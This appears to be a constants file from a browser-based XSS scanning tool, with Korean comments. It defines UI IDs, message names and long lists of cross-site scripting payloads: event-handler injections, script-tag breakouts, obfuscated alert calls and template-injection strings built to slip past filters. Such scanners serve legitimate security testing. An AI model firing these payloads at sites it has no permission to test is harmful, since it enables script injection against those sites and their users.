//
// 요소 ID
export const USER_OPTIONS      = ["url", "param", "delay", "useCookies"]; // 사용자 입력 요소 ID
export const SCAN_VAL          = ["test-param"];
export const ERROR_BANNER      = "errorBanner";               // 에러 출력 요소 ID
export const SIGN              = "user_option";               // html 요소 식별 마커  
export const OBSERV_DATA       = "opservation";               // 
export const POPUP4_TAB        = "find_url";                  // 

// 
// 테스트 표시 요소 
export const XSS_MARKER        = "Qw4pl0ui";                  // reflection  확인 문자열
export const XSS_INJECT_TARGET = "XSS_T";                     // 공격 파라미터 표시 문자열
export const START_CHUNCK      = "P0tOc";                     // 필터링 확인 시작 문자열
export const END_CHUNK         = "ZnFer";                     // 필터링 확인 끝 문자열 

//
// 용도별 메세지
export const START_MSG        = {status : "started"};         // 테스트 시작 응답 메세지
export const FILTER_CHECK     = "START_FILTER";               // 필터 체크 시작 메세지
export const REPLAY_CHECK     = "REPLAY_FILTER";              // 재스캔 메세지
export const ATTACK_START     = "START_ATTACK";               // 공격 시작 메세지
export const ERROR_MSG        = "ERROR";                      // 에러 메세지
export const HTML_CAPTURED    = "HTML_CAPTURED";              // 현재 url html 캡처 메세지
export const FILTER_RESULT    = "FILTER_RESULT_MSG";          // 필터링 결과 메세지
export const FILTER_DATA      = "ft-msg";                     // 필터링 데이터 msg
export const ATTACK_RESULT    = "ATTACK_RESULT_MSG";          // 공격 결과 메세지
export const ATTACK_DATA      = "atk-msg";                    // 공격 데이터 msg
export const mov_popup2       = "GO_TO_POPUP2";               // popup2 이동 메세지
export const mov_result       = "GO_TO_RESULT";               // popup3 이동 메세지

//
// 자바스크립트 추출 표현식 
export const JAVASCRIPT_REGEXP = /<script[^>]*>([\s\S]*?)<\/script>/gi;
export const VULN_REGEXP       = /Vulnerable/

export const ABNORMAL_START    = "abnormal_start";
export const ABNORMAL_END      = "abnormal_end";

export const OPTION_KEYS = {
    "url"           : "url"    , 
    "target_params" : "param"  ,
    "delay"         : "delay",
    "cookie"        : "useCookies"
}

export const VOID_TAGS = [
    "area", "base", "br", "col", "embed", "hr","img", 
    "input", "link", "meta", "source","track", "wbr"
];

export const REQUEST_ATTRIBUTES = ([
  "href", "src", "action", "formaction", 
  "data", "poster", "xlink:href"   
]);

export const FG = "XSS_PAY_FUNC_INJECT"

export const PAY_FUNC = [
		"alert", "confirm", "prompt", "alert.bind()", "confirm.call()",
		"prompt.valueOf()", "print", "console.log", "console.error", "console.warn",
];

export const PAY_HTML = [
  "<sVg/onload=XSS_PAY_FUNC_INJECT(plum) class=aswerf>",
  "<ScRipt class=dalfox>XSS_PAY_FUNC_INJECT(plum)</script>",
  "<iframe srcdoc=\"<input onauxclick=XSS_PAY_FUNC_INJECT(plum)>\" class=aswerf></iframe>",
  "<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() class=aswerf>",
  "<audio controls ondurationchange=XSS_PAY_FUNC_INJECT(plum) id=aswerf><source src=1.mp3 type=audio/mpeg></audio>",
  "<div contextmenu=xss><p>1<menu type=context class=aswerf id=xss onshow=XSS_PAY_FUNC_INJECT(plum)></menu></div>",
  "<iFrAme/src=jaVascRipt:XSS_PAY_FUNC_INJECT(plum) class=aswerf></iFramE>",
  "<xmp><p title=\"</xmp><svg/onload=XSS_PAY_FUNC_INJECT(plum) class=aswerf>",
  "<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a()>",
  "<audio controls ondurationchange=v(plum)><source src=1.mp3 type=audio/mpeg></audio>",
  "<div contextmenu=xss><p>1<menu type=context onshow=alert(plum)></menu></div>",
  "<iFrAme/src=jaVascRipt:XSS_PAY_FUNC_INJECT(plum)></iFramE>",
  "<xmp><p title=\"</xmp><svg/onload=XSS_PAY_FUNC_INJECT(plum)>",
  "<sVg/onload=XSS_PAY_FUNC_INJECT(plum)>",
  "<ScRipt>XSS_PAY_FUNC_INJECT(plum)</script>",
  "<cst class=aswerf>",
  "<video controls oncanplay=XSS_PAY_FUNC_INJECT(plum) class=aswerf><source src=1.mp4></video>",
  "<canvas onwebglcontextlost=XSS_PAY_FUNC_INJECT(plum) class=aswerf></canvas>",
  "<dialog open onclose=XSS_PAY_FUNC_INJECT(plum) class=aswerf>XSS</dialog>",
  "<slot onslotchange=XSS_PAY_FUNC_INJECT(plum) class=aswerf></slot>",
  "<template onload=XSS_PAY_FUNC_INJECT(plum) class=aswerf></template>",
  "<picture onload=XSS_PAY_FUNC_INJECT(plum) class=aswerf><source srcset=x><img src=x></picture>",
  "<track onload=XSS_PAY_FUNC_INJECT(plum) class=aswerf>",
  "<source onload=XSS_PAY_FUNC_INJECT(plum) class=aswerf>",
  "<progress onload=XSS_PAY_FUNC_INJECT(plum) class=aswerf></progress>",
  "<meter onload=XSS_PAY_FUNC_INJECT(plum) class=aswerf></meter>",
  "<output onload=XSS_PAY_FUNC_INJECT(plum) class=aswerf></output>",
  "<datalist onload=XSS_PAY_FUNC_INJECT(plum) class=aswerf></datalist>",
  "<keygen onload=XSS_PAY_FUNC_INJECT(plum) class=aswerf>",
  "<summary ontoggle=XSS_PAY_FUNC_INJECT(plum) class=aswerf>Click</summary>",
  "<details ontoggle=XSS_PAY_FUNC_INJECT(plum) class=aswerf open><summary>XSS</summary></details>",
  "<div onpointerrawupdate=XSS_PAY_FUNC_INJECT(plum) class=aswerf></div>",
  "<div ongotpointercapture=XSS_PAY_FUNC_INJECT(plum) class=aswerf></div>",
  "<div onlostpointercapture=XSS_PAY_FUNC_INJECT(plum) class=aswerf></div>",
  "<div onpointercancel=XSS_PAY_FUNC_INJECT(plum) class=aswerf></div>",
  "<div onanimationstart=XSS_PAY_FUNC_INJECT(plum) class=aswerf></div>",
  "<div onanimationend=XSS_PAY_FUNC_INJECT(plum) class=aswerf></div>",
  "<div onanimationiteration=XSS_PAY_FUNC_INJECT(plum) class=aswerf></div>",
  "<div ontransitionstart=XSS_PAY_FUNC_INJECT(plum) class=aswerf></div>",
  "<div ontransitionrun=XSS_PAY_FUNC_INJECT(plum) class=aswerf></div>",
  "<div ontransitioncancel=XSS_PAY_FUNC_INJECT(plum) class=aswerf></div>",
  "<div onselectionchange=XSS_PAY_FUNC_INJECT(plum) class=aswerf></div>",
  "<div onselectstart=XSS_PAY_FUNC_INJECT(plum) class=aswerf></div>",
  "<div onbeforeinput=XSS_PAY_FUNC_INJECT(plum) class=aswerf></div>",
  "<div oninputsourceschange=XSS_PAY_FUNC_INJECT(plum) class=aswerf></div>",
  "<div oncompositionstart=XSS_PAY_FUNC_INJECT(plum) class=aswerf></div>",
  "<div oncompositionupdate=XSS_PAY_FUNC_INJECT(plum) class=aswerf></div>",
  "<div oncompositionend=XSS_PAY_FUNC_INJECT(plum) class=aswerf></div>"
]

export const PAY_JAVASCRIPT_TAG = [
  "</sCRipt><sVg/onload=alert(plum)>",
	"</scRiPt><sVG/onload=confirm(plum)>",
	"</sCrIpt><SVg/onload=prompt(plum)>",
	"</sCrIpt><SVg/onload=print(plum)>",
	"</sCriPt><ScRiPt>alert(plum)</sCrIpt>",
	"</scRipT><sCrIpT>confirm(plum)</SCriPt>",
	"</ScripT><ScRIpT>prompt(plum)</scRIpT>",
	"</ScripT><ScRIpT>print(plum)</scRIpT>"
]

export const PAY_JAVASCRIPT_CODE = [
  "alert(plum)",
  "confirm(plum)",
  "prompt(plum)",
  "print(plum)",
  "alert.call(null,plum)",
  "confirm.call(null,plum)",
  "prompt.call(null,plum)",
  "alert.apply(null,[plum])",
  "prompt.apply(null,[plum])",
  "confirm.apply(null,[plum])",
  "window['ale'+'rt'](window['doc'+'ument']['dom'+'ain'])",
  "this['ale'+'rt'](this['doc'+'ument']['dom'+'ain'])",
  "self[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]])",
  "globalThis[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);",
  "parent['ale'+'rt'](parent['doc'+'ument']['dom'+'ain'])",
  "top[/al/.source+/ert/.source](/XSS/.source)",
  "frames[/al/.source+/ert/.source](/XSS/.source)",
  "self[/*foo*/'prompt'/*bar*/](self[/*foo*/'document'/*bar*/]['domain'])",
  "this[/*foo*/'alert'/*bar*/](this[/*foo*/'document'/*bar*/]['domain'])",
  "this[/*foo*/'print'/*bar*/](this[/*foo*/'document'/*bar*/]['domain'])",
  "window[/*foo*/'confirm'/*bar*/](window[/*foo*/'document'/*bar*/]['domain'])",
  "{{toString().constructor.constructor('alert(plum)')()}}",
  "{{-function(){this.alert(plum)}()}}",
  "</sCRipt><sVg/onload=alert(plum)>",
  "</scRiPt><sVG/onload=confirm(plum)>",
  "</sCrIpt><SVg/onload=prompt(plum)>",
  "</sCrIpt><SVg/onload=print(plum)>",
  "</sCriPt><ScRiPt>alert(plum)</sCrIpt>",
  "</scRipT><sCrIpT>confirm(plum)</SCriPt>",
  "</ScripT><ScRIpT>prompt(plum)</scRIpT>",
  "</ScripT><ScRIpT>print(plum)</scRIpT>",
]

export const PAY_EVENT = [
  "onload",
  "onerror",
  "onmouseover",
  "onmouseenter",
  "onmouseleave",
  "onmouseenter",
  "onmouseenter",
  "onpointerover",
  "onpointerdown",
  "onpointerenter",
  "onpointerleave",
  "onpointermove",
  "onpointerout",
  "onpointerup",
  "ontouchstart",
  "ontouchend",
  "ontouchmove",
  "ontransitionend",
  "oncontentvisibilityautostatechange"
]

export const PAY_ATTR_FUNC = [
  "=alert(plum) class=aswerf ",
  "=confirm(plum) class=aswerf ",
  "=alert.call(null,plum) class=aswerf ",
  "=confirm.call(null,plum) class=aswerf ",
  "=prompt.call(null,plum) class=aswerf ",
  "=alert.apply(null,plum) class=aswerf ",
  "=confirm.apply(null,plum) class=aswerf ",
  "=prompt.apply(null,plum) class=aswerf ",
  "=print(plum) class=aswerf "
]